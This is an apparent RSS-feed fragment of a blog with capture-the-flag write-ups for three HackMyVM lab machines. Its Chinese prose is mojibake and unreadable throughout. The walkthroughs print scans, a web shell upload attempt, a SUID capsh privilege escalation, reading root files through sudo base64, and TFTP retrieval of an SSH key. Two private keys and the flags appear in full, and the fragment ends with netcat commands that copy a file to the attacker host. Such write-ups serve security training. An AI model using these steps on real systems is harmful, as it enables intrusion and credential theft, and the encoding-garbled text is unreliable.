<br>è§£å¯† <br>æ„æ€æ˜¯æˆ‘ä»¬éœ€è¦è®¿é—®è¿™3000ä¸ªç«¯å£ ç„¶åå°±ä¼šæœ‰ä¸€ä¸ªæœåŠ¡æ‰“å¼€<br>ä¾æ¬¡è®¿é—®è¿™äº›ç«¯å£<br>knock 192.168.9.11 1000 2000 3000 -v
<br>ç„¶åé‡æ–°æ‰«æä¸€ä¸‹<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sS 192.168.9.11 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:30 CST
Nmap scan report for 192.168.9.11
Host is up (0.00023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
<br>å¯ä»¥å‘ç°22 80éƒ½å¼€æ”¾äº†<br>è®¿é—®ç½‘ç«™<br>å•¥éƒ½æ²¡æœ‰<br>ç›´æ¥æ‰«ç›®å½•<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# gobuster dir -u http://192.168.9.11/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/home/]
/admin                (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/admin/]
/secret               (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/secret/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
<br>
æ•²äº†åŠå¤©å¼€ä¸äº†é—¨ã€‚ç›®å½•è®¿é—®ä¸äº†ã€‚åé¢çœ‹wpå‘ç°æ˜¯ç½‘å¡é—®é¢˜
<br>è¿™é‡Œç›´æ¥ç»™flag<br>root@alzheimer:~# cat /root/root.txt
HMVlovememories
root@alzheimer:~# cat /home/medusa/user.txt
HMVrespectmemories
root@alzheimer:~# 
<br>è¿˜æ˜¯çœ‹ä¸‹é¢˜ç›®çš„è€ƒç‚¹å§ã€‚<br>æ•²é—¨æˆåŠŸåè®¿é—®ç½‘ç«™æ ¹ç›®å½•<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" referrerpolicy="no-referrer"><br>ä¸‹é¢åº”è¯¥æ˜¯ä¸€ä¸ªæ‘©æ–¯å¯†ç <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.002.png" referrerpolicy="no-referrer"><br>OTHINGM
<br>è¿™ä¸ªåº”è¯¥å°±æ˜¯medusaçš„å¯†ç äº†<br>ä½†æ˜¯æ˜¯ä¸å¯¹çš„<br>ç»§ç»­çœ‹ç½‘ç«™çš„å…¶ä»–ç›®å½•<br>adminç›®å½•æ˜¯ç©ºçš„<br>homeç›®å½•ä¸‹çš„æ–‡ä»¶æç¤ºæˆ‘ä»¬passåœ¨Homeç›®å½•ï¼Œä½†ä¸æ˜¯è¿™ä¸ªhomeç›®å½•<br>secretç›®å½•æç¤ºæˆ‘ä»¬å¯†ç åœ¨è¿™ä¸ªsecretç›®å½•çš„æŸä¸ªç›®å½•ä¸‹<br>é‚£å¯†ç å°±æ˜¯åœ¨/secret/homeç›®å½•<br>/secret/homeç›®å½•çš„æ–‡ä»¶ç»™äº†ä¸ªå•¥ç”¨æ²¡æœ‰çš„æç¤º<br>æ ¹ç›®å½•ç»™æˆ‘ä»¬è¯´ä»–å°†å¯†ç å†™å…¥äº†ä¸€ä¸ª.txtæ–‡ä»¶<br>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå”¯ä¸€è·å–åˆ°çš„.txtæ–‡ä»¶å°±æ˜¯.secretnote.txt<br>I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
<br>é‡Œé¢çš„Ihavebeenalwayshere!!! å°±æ˜¯medusaçš„å¯†ç <br><br>è™½ç„¶flagæœ‰äº†ï¼Œä½†è¿˜æ˜¯çœ‹çœ‹ææƒéƒ¨åˆ†å§<br>æ‹¿åˆ°ç”¨æˆ·medusaçš„æƒé™å<br>medusa@alzheimer:/root$ find / -perm -4000  2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/sbin/capsh
<br>capsh --gid=0 --uid=0 --
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.003.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/9.alzheimer.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/9.Alzheimer.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[8.BaseME]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. BASE64ç¼–ç ç›®å½•çˆ†ç ´" data-href="#3. BASE64ç¼–ç ç›®å½•çˆ†ç ´" href="https://www.c1trus.top/about:blank#3._BASE64ç¼–ç ç›®å½•çˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">3. BASE64ç¼–ç ç›®å½•çˆ†ç ´</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒ" data-href="#4. ææƒ" href="https://www.c1trus.top/about:blank#4._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒ</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=BaseME
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šbase64ç¼–ç æ‰«æã€linuxbase64ç¼–ç è‡ªå¸¦æ¢è¡Œç¬¦ã€
<br><br>ç«¯å£æ‰«æ<br>â”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sS 192.168.9.10  -p 1-65535 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 21:25 CST
Nmap scan report for 192.168.9.10
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:7C:3B:62 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png" referrerpolicy="no-referrer"><br>ä¸Šé¢æ˜¯ä¸€ä¸²base64ç¼–ç çš„å­—ç¬¦ä¸²<br>è§£ç å¾—åˆ°<br>ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas
<br>æç¤ºæˆ‘ä»¬æˆ‘ä»¬æƒ³è¦çš„éƒ½å¯ä»¥é€šè¿‡base64è·å–<br>å°è¯•çˆ†ç ´ç›®å½•å‘ç°æ²¡æœ‰ç»“æœã€‚çŒœæµ‹å¯èƒ½æ˜¯éœ€è¦base64åŠ å¯†<br><br>ç›´æ¥å¯¹å­—å…¸è¿›è¡Œé€è¡Œbase64åŠ å¯†<br>import base64

def encode\_file\_line\_by\_line(*input\_file*, *output\_file*):
    with open(*input\_file*, 'r', *encoding*='utf-8') as infile, open(*output\_file*, 'w', *encoding*='utf-8') as outfile:
        for line in infile:
            *# ç›´æ¥å¯¹æ•´è¡Œï¼ˆåŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰è¿›è¡Œ Base64 ç¼–ç *
            encoded\_line = base64.b64encode(line.encode()).decode()
            *# å°†ç¼–ç åçš„å†…å®¹å†™å…¥è¾“å‡ºæ–‡ä»¶ï¼Œå¹¶æ·»åŠ æ¢è¡Œç¬¦*
            outfile.write(encoded\_line + '\n')

*# ä½¿ç”¨ç¤ºä¾‹*
input\_file = 'dicc.txt'  *# è¾“å…¥æ–‡ä»¶è·¯å¾„*
output\_file = 'base64\_dicc.txt'  *# è¾“å‡ºæ–‡ä»¶è·¯å¾„*
encode\_file\_line\_by\_line(input\_file, output\_file)
<br>ç„¶åçˆ†ç ´<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.002.png" referrerpolicy="no-referrer"><br>/aWRfcnNhCg==
/cm9ib3RzLnR4dAo=
<br>è·å–äº†ç§é’¥<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.002.png" referrerpolicy="no-referrer"><br>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
<br>sshè¿ä¸Šå»<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.003.png" referrerpolicy="no-referrer"><br>æç¤ºéœ€è¦ç§é’¥å¯†ç <br>çŒœæµ‹å°±æ˜¯å¼€å§‹ä¸‹é¢é‚£å¥è¯çš„Base64ç¼–ç <br>iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
<br>è¿™é‡Œç›´æ¥é€è¡ŒBase64åŠ å¯†æ˜¯ä¸è¡Œçš„ï¼Œåé¢è¦åŠ ä¸Šä¸€ä¸ªå›è½¦æ‰æ˜¯å¯¹çš„ï¼ˆå› ä¸ºä»–è¿™é‡Œé¢çš„ç¼–ç éƒ½æ˜¯linuxé‡Œé¢è¿›è¡Œçš„ã€‚linuxé»˜è®¤å¯¹å­—ç¬¦ä¸²è¿›è¡Œbase64ç¼–ç åé¢æ˜¯å¸¦æœ‰æ¢è¡Œç¬¦çš„ï¼‰<br>ç¬¬ä¸€ä¸ªåŠ å¯†å°±æ˜¯å¯¹çš„<br>iloveyou ã€‹aWxvdmV5b3UK
<br>ç„¶åå°±èƒ½è¿æ¥ä¸Šæ¥äº†<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.004.png" referrerpolicy="no-referrer"><br><br>lucas@baseme:~$ find / -perm -4000 2&gt;/dev/null
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
lucas@baseme:~$ sudo -l
Matching Defaults entries for lucas on baseme:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucas may run the following commands on baseme:
    (ALL) NOPASSWD: /usr/bin/base64
lucas@baseme:~$ 
<br>sudo base64 "/root/root.txt" |base64 --decode
<br>è¿™é‡Œåº”è¯¥è¯»å–ç§é’¥ç„¶åè¿æ¥<br>æˆ‘è¿™é‡Œç›´æ¥å·æ‡’è¯»å–flagäº†]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/8.baseme.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/8.BaseME.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Hommie]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. 1.ä¿¡æ¯æ”¶é›†" data-href="#2. 1.ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._1.ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. 1.ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. 2.FTPåŒ¿åç™»å½•" data-href="#3. 2.FTPåŒ¿åç™»å½•" href="https://www.c1trus.top/about:blank#3._2.FTPåŒ¿åç™»å½•" class="internal-link" target="_self" rel="noopener nofollow">3. 2.FTPåŒ¿åç™»å½•</a>
<br><a data-tooltip-position="top" aria-label="4. 3.UDPæ‰«æ" data-href="#4. 3.UDPæ‰«æ" href="https://www.c1trus.top/about:blank#4._3.UDPæ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">4. 3.UDPæ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="5. 4.tftpè¿æ¥" data-href="#5. 4.tftpè¿æ¥" href="https://www.c1trus.top/about:blank#5._4.tftpè¿æ¥" class="internal-link" target="_self" rel="noopener nofollow">5. 4.tftpè¿æ¥</a>
<br><a data-tooltip-position="top" aria-label="6. 5.ææƒ" data-href="#6. 5.ææƒ" href="https://www.c1trus.top/about:blank#6._5.ææƒ" class="internal-link" target="_self" rel="noopener nofollow">6. 5.ææƒ</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Hommie
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šTFTPæœåŠ¡ã€ç¯å¢ƒå˜é‡ä¿®æ”¹ã€
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap 192.168.9.9 -p 1-65535     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 17:09 CST
Nmap scan report for 192.168.9.9
Host is up (0.00053s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:91:0D:AD (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
<br>å…ˆçœ‹ä¸‹ç½‘ç«™<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png" referrerpolicy="no-referrer"><br>æç¤ºæˆ‘ä»¬ä»–çš„ ç§é’¥æ³„éœ²äº†ã€‚é‚£æˆ‘ä¼°è®¡å°±æ˜¯ç”¨ä»–çš„ç§é’¥å»sshé¶æœºäº†<br>å…ˆæ‰«ä¸€æ³¢ç½‘ç«™ç›®å½•<br>å•¥ä¹Ÿæ²¡æœ‰<br><br>å¼€æ”¾äº†ftpæœåŠ¡ã€‚å¯èƒ½å­˜åœ¨ftpåŒ¿åç™»å½• å°è¯•è¿æ¥ä¸€ä¸‹<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# ftp 192.168.9.9         
Connected to 192.168.9.9.
220 (vsFTPd 3.0.3)
Name (192.168.9.9:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||45506|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.
ftp&gt; get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||13697|)
150 Opening BINARY mode data connection for index.html (0 bytes).
     0        0.00 KiB/s 
226 Transfer complete.
ftp&gt; ls -a
229 Entering Extended Passive Mode (|||39331|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .web
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.
<br>æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªindex.html é‡Œé¢æ˜¯ç©ºçš„<br>è¿˜æœ‰ä¸€ä¸ªéšè—ç›®å½•.web<br>é‡Œé¢æ˜¯çœŸæ­£çš„index.html<br>ftp&gt; ls -a
229 Entering Extended Passive Mode (|||6919|)
150 Here comes the directory listing.
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
-rw-r--r--    1 0        0              99 Sep 30  2020 index.html
226 Directory send OK.
ftp&gt; get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||64608|)
150 Opening BINARY mode data connection for index.html (99 bytes).
100% |\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*|    99        1.81 MiB/s    00:00 ETA
226 Transfer complete.
99 bytes received in 00:00 (85.93 KiB/s)
<br>å‘ç°å…¶å†…å®¹å°±æ˜¯è¿™ä¸ªç½‘ç«™é¦–é¡µçš„å†…å®¹<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.002.png" referrerpolicy="no-referrer"><br>é‚£ä¹ˆå¤§æ¦‚ç‡.webç›®å½•å°±æ˜¯ç½‘ç«™çš„æ ¹ç›®å½•äº†ã€‚ä¼ ä¸€ä¸ªé©¬ä¸Šå»<br>ä¸Šä¼ åè®¿é—®å‘ç°ä¸èƒ½å¯¹phpè¿›è¡Œè§£æã€‚å¯èƒ½æ˜¯ç›®å½•é™åˆ¶<br>æˆ‘ä»¬æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œå‘ç°å‘½ä»¤ä¹Ÿæ”¶åˆ°äº†é™åˆ¶ã€‚é‚£è¿™é‡Œæˆ‘ä»¬åº”è¯¥è¦æ¢ä¸€æ¡è·¯äº†<br><br>å¯¹é¶æœºè¿›è¡Œudpæ‰«æ<br>â”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sU  192.168.9.9 -p 1-100 //é™åˆ¶ç«¯å£ Udpæ‰«çš„å¾ˆæ…¢
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 17:52 CST
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 52.80% done; ETC: 17:54 (0:00:37 remaining)
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 67.80% done; ETC: 17:54 (0:00:32 remaining)
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 68.80% done; ETC: 17:54 (0:00:31 remaining)
Stats: 0:01:42 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 91.30% done; ETC: 17:54 (0:00:09 remaining)
Nmap scan report for 192.168.9.9
Host is up (0.00056s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
MAC Address: 08:00:27:91:0D:AD (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 124.69 seconds
<br><br>å¯ä»¥å‘ç°å¼€å¯äº†tftpæœåŠ¡ï¼ŒTFTP æ²¡æœ‰èº«ä»½éªŒè¯æœºåˆ¶ï¼Œä¸”ä¸åŠ å¯†ä¼ è¾“<br>åˆ©ç”¨tftpè¿æ¥æœåŠ¡å™¨<br><br>tftp 192.168.9.9
get id\_rsa //çŒœæµ‹è¿™é‡Œæœ‰ç§é’¥
<br>åˆ©ç”¨ä¸‹è½½çš„ç§é’¥è¿æ¥<br>chmod 600 id\_rsa
ssh -i id\_rsa alexia@192.168.9.9
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.003.png" referrerpolicy="no-referrer"><br><br>alexia@hommie:~$ find / -perm -4000 2&gt;/dev/null
/opt/showMetheKey
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
alexia@hommie:~$ sudo -l
-bash: sudo: command not found
<br>lexia@hommie:/opt$ ./showMetheKey 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7
V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y
Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT
gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j
QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq
kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI
M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM
dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW
rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B
tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T
d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/
+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE
Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w
pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk
WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz
bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu
3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6
0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z
HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs
y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY
OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08
QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp
ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN
0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
alexia@hommie:/opt$ 
<br>è¿™é‡Œç»™äº†ä¸€ä¸ªç§é’¥ï¼Œç»è¿‡éªŒè¯è¿™ä¸ªå°±æ˜¯alexiaç”¨æˆ·çš„<br>æˆ‘ä»¬çœ‹é€†å‘åˆ†æä¸€ä¸‹è¿™ä¸ªç¨‹åº<br>nc -lp 1234 &gt;showmethekey //kaliæ‰§è¡Œ
nc 192.168.9.3 1234 &lt; showMetheKey //é¶æœºæ‰§è¡Œ
